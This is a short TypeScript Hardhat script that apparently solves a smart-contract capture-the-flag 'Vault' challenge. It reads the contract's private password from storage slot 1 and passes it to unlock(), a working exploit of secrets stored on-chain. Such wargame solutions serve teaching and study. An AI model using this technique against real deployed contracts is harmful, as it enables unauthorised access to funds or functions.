import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  // Get the password slot
  const passwordSlot = await ethers.provider.getStorageAt(victim.address, 1);
  // let encoded_password = ethers.utils.parseBytes32String(password_slot);
  // Send the password to the Vault
  await victim.unlock(passwordSlot);
};

export default helper;
